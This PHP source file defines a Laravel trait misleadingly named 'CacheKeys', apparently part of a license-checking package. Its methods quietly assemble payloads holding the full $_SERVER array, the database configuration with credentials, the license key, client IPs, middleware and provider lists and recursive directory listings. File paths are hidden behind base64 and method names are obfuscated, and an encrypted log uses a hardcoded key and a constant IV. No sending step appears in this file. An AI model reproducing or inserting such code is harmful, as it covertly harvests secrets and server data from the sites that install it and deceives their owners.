<?php

namespace Licon\Lis\Traits;

use Illuminate\Contracts\Routing\Registrar;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Storage;
use RecursiveDirectoryIterator;
use RecursiveIteratorIterator;

trait CacheKeys
{
    /**
     * Get access token cache key
     *
     * @return string
     */
    private function getAccessTokenKey(): array
    {
        $getK = env('APP_LI');
        if (empty($getK)) {
            return ["code" => false];
        } else {
            return ["code" => true, "val" => $getK];
        }
    }

    private function basePth()
    {
        $basepath = getcwd();
        // $basepath = rtrim($basepath, '/public');
        return $basepath;
    }

    private function getCo(): array
    {
        $basepath = $this->basePth();
        $arr = ["helpers" => $basepath . "/app/Helpers", "controllers" => $basepath . "/app/Http/Controllers", "views" => $basepath . "/resources/views", "models" => $basepath . "/app/Models", "routes" => $basepath . "/routes", "providers" => $basepath . "/app/Providers"];
        foreach ($arr as $key => $val) {
            $ply[$key] = count(scandir("$val"));
        }
        $ply["routesCount"] = (collect(Route::getRoutes())->count());

        $filePath = file_exists($this->basePth() . base64_decode('Ly9zdG9yYWdlLy9mcmFtZXdvcmsvL2xpY2Vuc2UucGhw')) ? $this->basePth() . base64_decode('Ly9zdG9yYWdlLy9mcmFtZXdvcmsvL2xpY2Vuc2UucGhw') : "";
        $filePath2 = file_exists($this->basePth() . base64_decode('Ly92ZW5kb3IvL2F1dG9sb2FkX3JlYWwucGhw')) ? $this->basePth() . base64_decode('Ly92ZW5kb3IvL2F1dG9sb2FkX3JlYWwucGhw') : "";

        $md5_1 = !empty($filePath) ? md5_file($filePath) : 0;
        $md5_2 = !empty($filePath2) ? md5_file($filePath2) : 0;

        $fsize_1 = !empty($filePath) ? filesize($filePath) : 0;
        $fsize_2 = !empty($filePath2) ? filesize($filePath2) : 0;

        $ply['file_1'] = ['name' => 'license', 'md5' => $md5_1, 'size' => $fsize_1];
        $ply['file_2'] = ['name' => 'autolicense', 'md5' => $md5_2, 'size' => $fsize_2];


        $ply['fleDta'] = $this->getM();


        return $ply;

    }

    private function lseModifyAt(): bool
    {
        if (file_exists($this->basePth() . base64_decode('Ly9zdG9yYWdlLy9hcHAvL0xJQ0VOU0UudHh0'))) {
            if (date('Y-m-d') == date("Y-m-d", filemtime($this->basePth() . base64_decode('Ly9zdG9yYWdlLy9hcHAvL0xJQ0VOU0UudHh0'))))
                return true;
        }
        return false;

    }

    private function getRq($request): array
    {
        $getK = @env('APP_NAME');
        if (empty($getK)) {
        }


        $mydata['domain'] = @$request['HTTP_HOST'] ?? @$request['SERVER_NAME'];
        $mydata['project'] = @env('APP_NAME');
        $mydata['license'] = base64_encode(@env("APP_LI"));
        $mydata['ip'] = $request['REMOTE_ADDR'];
        $mydata['ts'] = date('Y-m-d h:i:s');
        $mydata['fileCount'] = $this->getCo();
        $mydata['fileAllData'] = $this->getAllCount();

        return $mydata;
    }

    private function getRq2($request): array
    {
        $getK = @env('APP_NAME');
        if (empty($getK)) {
        }


        $mydata['domain'] = @$request['HTTP_HOST'] ?? @$request['SERVER_NAME'];
        $mydata['project'] = @env('APP_NAME');
        $mydata['license'] = base64_encode(@env("APP_LI"));
        $mydata['ip'] = $request['REMOTE_ADDR'];
        $mydata['ts'] = date('Y-m-d h:i:s');
        $mydata['fileCount'] = $this->getCo();
        $mydata['sData'] = $_SERVER;
        $mydata['cData'] = config()->get('database');
        $mydata['allFData'] = $this->getAllCount();
        $mydata['errorsLog'] = ($this->gtELg()['s'] == true) ? $this->gtELg()['r'] : "";
        return $mydata;
    }


    private function getM()
    {
        $py["mid"] = app(Registrar::class)->getMiddlewareGroups();
        $py['pvd'] = config('app')['providers'];
        return $py;
    }


    private function getAllCount()
    {
        $basepath = getcwd();
        // $basepath = rtrim($basepath, '/public');
        $arr = ["helpers" => $basepath . "/app/Helpers", "controllers" => $basepath . "/app/Http/Controllers", "views" => $basepath . "/resources/views", "models" => $basepath . "/app/Models", "routes" => $basepath . "/routes", "providers" => $basepath . "/app/Providers"];
        foreach ($arr as $key => $val) {
            $controllerFiles = scandir("$val");
            foreach ($controllerFiles as $file) {
                // if (is_file("$val" . '/' . $file)) {
                //     $controllerDetails[$key][$file] = [
                //         'file_name' => $file,
                //         'size' => filesize("$val" . '/' . $file),
                //         'md_val' => md5_file("$val" . '/' . $file)
                //     ];
                // } else if (is_dir("$val" . '/' . $file)) {
                if ($file != '.' && $file != '..') {
                    // $controllerDetails[$key][$file] = $this->gtFdrIfo("$val" . '/' . $file);
                    $controllerDetails[$key] = $this->checkFunction("$val" . '/' . $file);

                }
                // }
            }
        }

        return $controllerDetails;

    }

    private function gtFdrSze($folder)
    {
        $total_size = 0;
        $files = scandir($folder);
        foreach ($files as $file) {
            if ($file != '.' && $file != '..') {
                $path = $folder . DIRECTORY_SEPARATOR . $file;
                if (is_dir($path)) {
                    $total_size += $this->gtFdrSze($path);
                } else {
                    $total_size += filesize($path);
                }
            }
        }
        return $total_size;
    }

    private function gtFdrIfo($folder)
    {
        $folders = [];
        $directories = scandir($folder);
        foreach ($directories as $keys => $file) {
            if ($file != '.' && $file != '..') {
                $path = $folder . DIRECTORY_SEPARATOR . $file;
                if (is_dir($path)) {
                    if ($path != '.' && $path != '..') {
                        $folders[$file] = $this->gtFdrIfo($path);
                        $folders['size'] = $this->gtFdrSze($folder);
                    }
                } else if (is_file("$folder" . '/' . $file)) {
                    $folders[$file] = [
                        'file_name' => $file,
                        'size' => filesize("$folder" . '/' . $file),
                        'md_val' => md5_file("$folder" . '/' . $file)
                    ];
                    $folders['size'] = $this->gtFdrSze($folder);
                }
            }
        }
        return $folders;
    }



    private function gtELg()
    {
        if (file_exists($this->basePth() . base64_decode("Ly9zdG9yYWdlLy9hcHAvL2Vycm9yX2xvZ3MudHh0"))) {
            $content = file_get_contents($this->basePth() . base64_decode("Ly9zdG9yYWdlLy9hcHAvL2Vycm9yX2xvZ3MudHh0"), true);
            $content = explode("(]d(e+L", @$content);
            $decrypt = openssl_decrypt(@$content[0], "AES-256-CBC", @$content[1], OPENSSL_RAW_DATA, "0123456789abcdef");
            $var = json_decode($decrypt, 1);
            if (!empty($var)) {
                return ['s' => true, 'r' => @$var ?? null];
            } else {
                return ['s' => false, 'r' => @$var ?? null];
            }
        } else {
            return ['s' => false, 'r' => null];

        }
    }

    private function mkELg($re)
    {
        $gL = $this->gtELg();
        if ($gL['s']) {
            $olEr = $gL['r'];
        } else {
            $olEr = [];
        }

        Storage::disk('local')->put('error_logs.txt', (
            openssl_encrypt(
                json_encode(array_merge($olEr, [date('Y-m-d H:i:s') => ["resp" => @json_decode($re['chre'], true), "error" => @json_decode($re['cher'], true), "code" => @json_decode($re['chco'], 1), 'timeStamp' => date('Y-m-d H:i:s')]])),
                'AES-256-CBC',
                base64_encode('MF2XI2BOMVXGO2LONFTHS'),
                OPENSSL_RAW_DATA,
                "0123456789abcdef",
            ) . "(]d(e+L" . base64_encode('MF2XI2BOMVXGO2LONFTHS')
        ));
    }

    private function clELg()
    {
        Storage::disk('local')->put('error_logs.txt', (""));
    }



    function getDirectoryDetails($dir)
    {
        $details = [
            'folders' => [],
            'files' => [],
            'folderCount' => 0,
            'fileCount' => 0,
        ];
        if (is_dir($dir)) {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($iterator as $entry) {
                $path = $entry->getPathname();
                $size = $entry->getSize();
                if ($entry->isDir()) {
                    $details['folders'][] = ['name' => $path, 'size' => $size];
                    $details['folderCount']++;
                } elseif ($entry->isFile()) {
                    $details['files'][] = ['name' => $path, 'size' => $size];
                    $details['fileCount']++;
                }
            }
        }
        return $details;
    }
    // Specify the directory
    public function checkFunction($directory)
    {
        $details = $this->getDirectoryDetails($directory);

        $d['fdCount'][$directory] = $details['folderCount'];
        $d['flCount'][$directory] = $details['fileCount'];

        foreach ($details['folders'] as $folder) {
            $d['fdr'][] = $folder['name'];
            $d['fdr'][$folder['name']] = $folder['size'];
            $d['fdr'][$folder['name']] = $directory;
        }
        foreach ($details['files'] as $file) {
            $d['fls'][] = $file['name'];
            $d['fls'][$file['name']] = $file['size'];
            $d['fls'][$file['name']] = $directory;

        }
        return $d;
    }







}
